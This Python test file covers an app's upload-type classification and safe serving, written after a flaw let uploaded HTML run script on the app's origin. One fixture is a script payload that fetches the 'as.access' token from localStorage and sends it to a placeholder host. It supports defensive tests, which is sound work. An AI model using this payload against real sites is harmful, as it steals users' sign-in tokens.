"""What an upload really is, and how its link serves it (Phase 7a.1).

Found in the gap review: uploads were stored with the browser's content type
and served from the app's own origin, so an HTML file with a script, opened
from a citation, ran as the app and could read the sign-in tokens. The type
is now the server's decision, at upload and again when a link is minted.
"""

from __future__ import annotations

import io
import zipfile

import pytest
from app.storage.file_types import (
    DOCX,
    UnsupportedUpload,
    classify_upload,
    content_disposition,
    serve_kind,
)

SCRIPT_PAGE = (
    b"<html><body><script>fetch('//x/?t='+localStorage['as.access'])</script>Policy</body></html>"
)


def _docx() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
    return buf.getvalue()


# ── at upload: the bytes decide ──────────────────────────────


def test_a_pdf_is_known_by_its_signature_whatever_it_claims() -> None:
    kind = classify_upload("scan", b"%PDF-1.7\n...", claimed="text/html")
    assert kind.mime == "application/pdf"


def test_a_word_file_is_known_by_its_structure() -> None:
    assert classify_upload("policy.docx", _docx(), claimed="application/octet-stream").mime == DOCX


def test_a_plain_zip_is_not_a_word_file() -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("readme.txt", "hi")
    with pytest.raises(UnsupportedUpload):
        classify_upload("policy.docx", buf.getvalue())


def test_text_formats_are_chosen_by_name() -> None:
    assert classify_upload("vpn.html", SCRIPT_PAGE).mime == "text/html"
    assert classify_upload("vpn.htm", SCRIPT_PAGE).mime == "text/html"
    assert classify_upload("vpn.md", b"# VPN").mime == "text/markdown"
    assert classify_upload("vpn.txt", b"VPN steps").mime == "text/plain"
    assert classify_upload("notes", b"no extension").mime == "text/plain"


def test_the_browser_type_only_breaks_ties_between_text_formats() -> None:
    # No extension: the claim may say which text format it is...
    assert classify_upload("page", SCRIPT_PAGE, claimed="text/html").mime == "text/html"
    # ...but it can never turn text into a PDF or anything else.
    assert classify_upload("page", SCRIPT_PAGE, claimed="application/pdf").mime == "text/plain"
    # And a name always wins over the claim.
    assert classify_upload("page.txt", SCRIPT_PAGE, claimed="text/html").mime == "text/plain"


def test_binary_that_is_none_of_the_formats_is_refused() -> None:
    with pytest.raises(UnsupportedUpload, match="PDF, Word"):
        classify_upload("setup.exe", b"MZ\x90\x00\x03\x00\x00\x00")
    with pytest.raises(UnsupportedUpload):
        classify_upload("image.png", b"\x89PNG\r\n\x1a\n\x00\x00")
    with pytest.raises(UnsupportedUpload):
        classify_upload("empty.txt", b"")


def test_text_in_other_encodings_is_still_text() -> None:
    assert classify_upload("old.txt", "Café menu".encode("cp1252")).mime == "text/plain"
    # A UTF-8 character cut at the 8 KiB sniffing boundary is still text.
    body = b"a" * 8191 + "é".encode()
    assert classify_upload("long.txt", body).mime == "text/plain"


ACTIVE = ("text/html", "application/xhtml+xml", "image/svg+xml", "text/xml", "application/xml")


@pytest.mark.parametrize(
    ("name", "body"),
    [
        ("p.pdf", b"%PDF-1.7"),
        ("p.docx", _docx()),
        ("p.html", SCRIPT_PAGE),
        ("p.md", b"# x"),
        ("p.txt", b"x"),
    ],
)
def test_no_kind_upload_can_produce_is_ever_served_as_an_active_type(
    name: str, body: bytes
) -> None:
    kind = classify_upload(name, body)
    assert not kind.serve_type.split(";")[0].strip().startswith(ACTIVE)
    assert not serve_kind(name, kind.mime).serve_type.split(";")[0].strip().startswith(ACTIVE)


# ── when a link is minted: never an active type ──────────────


@pytest.mark.parametrize(
    ("name", "stored"),
    [
        ("vpn.html", "text/html"),  # stored by the old code, as the browser claimed
        ("page", "text/html"),
        ("vpn.md", "text/markdown"),
        ("vpn.txt", "text/plain"),
        ("evil.html", "TEXT/HTML; charset=utf-8"),
    ],
)
def test_every_text_format_is_served_as_plain_text(name: str, stored: str) -> None:
    kind = serve_kind(name, stored)
    assert kind.serve_type == "text/plain; charset=utf-8"
    assert kind.disposition == "inline"


def test_a_pdf_opens_and_a_word_file_downloads() -> None:
    assert (
        serve_kind("p.pdf", "application/pdf").serve_type,
        serve_kind("p.pdf", "application/pdf").disposition,
    ) == ("application/pdf", "inline")
    docx = serve_kind("p.docx", DOCX)
    assert (docx.serve_type, docx.disposition) == (DOCX, "attachment")


@pytest.mark.parametrize(
    ("name", "stored"),
    [
        ("logo.svg", "image/svg+xml"),  # SVG can carry script
        ("page.xhtml", "application/xhtml+xml"),
        ("x", ""),
        ("x.bin", "application/javascript"),
    ],
)
def test_anything_else_downloads_as_opaque_bytes(name: str, stored: str) -> None:
    kind = serve_kind(name, stored)
    assert (kind.serve_type, kind.disposition) == ("application/octet-stream", "attachment")


def test_the_disposition_names_the_file_safely() -> None:
    kind = serve_kind("x.txt", "text/plain")
    header = content_disposition(kind, 'Leave "policy" é.txt')
    assert header.startswith('inline; filename="Leave _policy_ _.txt"')
    assert "filename*=UTF-8''Leave%20%22policy%22%20%C3%A9.txt" in header
    assert "\n" not in content_disposition(kind, "a\nb.txt")
